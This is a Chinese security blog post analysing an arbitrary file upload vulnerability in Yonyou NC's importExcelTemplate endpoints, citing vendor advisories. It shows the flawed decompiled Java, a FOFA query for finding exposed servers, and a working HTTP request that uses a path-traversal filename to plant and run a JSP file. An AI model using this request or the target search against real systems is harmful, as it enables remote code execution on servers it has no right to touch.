---
title: "用友NC importExcelTemplate 任意文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-nc-importExcelTemplate-upload-rce.html
asset_dir: assets/用友nc-importexceltemplate-任意文件上传漏洞
---

# 用友NC importExcelTemplate 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/15 08:29
- 1564浏览
- [6评论](#comment)
- 55分钟阅读

深入探索

计算机安全

安全

软件

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC的importExcelTemplate模块存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现[远程代码执行](https://mrxn.net/tag/rce)或服务器控制，影响系统的完整性和安全性。

漏洞扫描服务

# 影响版本

NC63、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据漏洞通告，可知漏洞点位于`importExcelTemplate`方法内

[![用友NC importExcelTemplate 任意文件上传漏洞](images/img-001-cf7e1bccfa9e.webp)](https://image.mrxn.net/9945f3e8d4d740199ae6d03032875687.webp)

直接搜索发现有三处实现了该方法

计算机服务器

[![用友NC importExcelTemplate 任意文件上传漏洞](images/img-002-48e4c34d50f5.webp)](https://image.mrxn.net/59442d87c6484f38affa6ccf1d231141.webp)

分别是 `CpDocAttrExcelImportAction`、`CpDocExcelImportAction`和`CpDocInfoPathImportAction`这三个类，先看下`CpDocInfoPathImportAction`类的实现逻辑

深入探索

文本剥离工具

Web安全书籍

Docker加速服务

## CpDocInfoPathImportAction

```
@Servlet(path="/infopathimport")
public class CpDocInfoPathImportAction
extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    private static MultipartHttpServletRequest getMultipartResolver(HttpServletRequest request) throws MultipartException {
        ((CommonsMultipartResolver)multipartResolver).setDefaultEncoding("UTF-8");
        return multipartResolver.resolveMultipart(request);
    }

    @Action
    public void importExcelTemplate() throws IOException {
        MultipartHttpServletRequest req = CpDocInfoPathImportAction.getMultipartResolver(this.request);
        Map fileMap = req.getFileMap();
        ArrayList files = new ArrayList();
        if (MapUtils.isNotEmpty((Map)fileMap)) {
            files.addAll(fileMap.values());
        }
        String name = ((MultipartFile)files.get(0)).getOriginalFilename();
        InputStream in = ((MultipartFile)files.get(0)).getInputStream();
        File xsnFile = new File(name);
        byte[] xsnFileBytes = IOUtils.read((InputStream)in);
        FileUtils.writeByteArrayToFile((File)xsnFile, (byte[])xsnFileBytes);
        in.close();
        LfwLogger.info((String)("upload xsn file name is :" + name));
    }
}
```

深入探索

Windows安全工具

网络安全培训

在线安全工具

整个类就一个action,也就是存在漏洞的方法`importExcelTemplate`，`importExcelTemplate`的实现也比较简单，直接将请求里的文件文件信息如文件名这些原封不动的取出来，然后调用**FileUtils.writeByteArrayToFile**写入文件，整个过程没有任何对文件的类型、后缀以及内容的校验措施，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

其他两个方法类似

安全运维咨询

## CpDocExcelImportAction

```
@Servlet(path="/excelimport")
public class CpDocExcelImportAction
extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    private static MultipartHttpServletRequest getMultipartResolver(HttpServletRequest request) throws MultipartException {
        ((CommonsMultipartResolver)multipartResolver).setDefaultEncoding("UTF-8");
        return multipartResolver.resolveMultipart(request);
    }

    @Action
    public void importExcelTemplate() throws IOException {
        MultipartHttpServletRequest req = CpDocExcelImportAction.getMultipartResolver(this.request);
        String billitem = req.getParameter("billitem");
        String[] params = billitem.split(";");
        HashMap<String, String> paramMap = new HashMap<String, String>(3);
        paramMap.put("pk_doctype", params[0]);
        paramMap.put("pk_org", params[1]);
        paramMap.put("pk_group", params[2]);
        Map fileMap = req.getFileMap();
        ArrayList files = new ArrayList();
        if (MapUtils.isNotEmpty((Map)fileMap)) {
            files.addAll(fileMap.values());
        }
        String name = ((MultipartFile)files.get(0)).getOriginalFilename();
        InputStream in = ((MultipartFile)files.get(0)).getInputStream();
        File xlsFile = new File(name);
        byte[] xlsxBytes = IOUtils.read((InputStream)in);
        FileUtils.writeByteArrayToFile((File)xlsFile, (byte[])xlsxBytes);
        in.close();
        LfwLogger.info((String)("upload xlsx file name is :" + name));
```

需要注意参数billitem的格式为 `1;2;3` 这种。

## CpDocAttrExcelImportAction

```
@Servlet(path="/attrexcelimport")
public class CpDocAttrExcelImportAction
extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    private static MultipartHttpServletRequest getMultipartResolver(HttpServletRequest request) throws MultipartException {
        ((CommonsMultipartResolver)multipartResolver).setDefaultEncoding("UTF-8");
        return multipartResolver.resolveMultipart(request);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Action
    public void importExcelTemplate() throws IOException {
        MultipartHttpServletRequest req = CpDocAttrExcelImportAction.getMultipartResolver(this.request);
        String pk_doc = req.getParameter("billitem");
        Map fileMap = req.getFileMap();
        ArrayList files = new ArrayList();
        if (MapUtils.isNotEmpty((Map)fileMap)) {
            files.addAll(fileMap.values());
        }
        String name = ((MultipartFile)files.get(0)).getOriginalFilename();
        InputStream in = ((MultipartFile)files.get(0)).getInputStream();
        File xlsFile = new File(name);
        byte[] xlsxBytes = IOUtils.read((InputStream)in);
        FileUtils.writeByteArrayToFile((File)xlsFile, (byte[])xlsxBytes);
        in.close();
```

总共三种url形式

漏洞扫描服务

- /attrexcelimport/importExcelTemplate
- /excelimport/importExcelTemplate
- /infopathimport/importExcelTemplate

# 漏洞复现

> 这个属于老洞，不过最近蜜罐监测到又有人来打。。。

```
POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq

------WebKitFormBoundaryNAL3EsrdN90G1hgq
Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\1.jsp"
application/octet-stream

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryNAL3EsrdN90G1hgq--
```

访问上传文件

搜索引擎

[![用友NC importExcelTemplate 任意文件上传漏洞](images/img-003-f0fdafa016df.webp)](https://image.mrxn.net/4195ea315fa542dfb9d615b42a8f5238.webp)

成功执行上传的代码，打印UUID并删除自身。

# 参考

- [关于NC系统importExcelTemplate接口的任意文件上传漏洞的安全通告](https://security.yonyou.com/#/noticeInfo?id=619)
- [关于portal端importExcelTemplate接口任意文件上传漏洞修复通告](https://security.yonyou.com/#/noticeInfo?id=729)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.CpDocInfoPathImportAction](#toc-4-1-)
- [4.2.CpDocExcelImportAction](#toc-4-2-)
- [4.3.CpDocAttrExcelImportAction](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
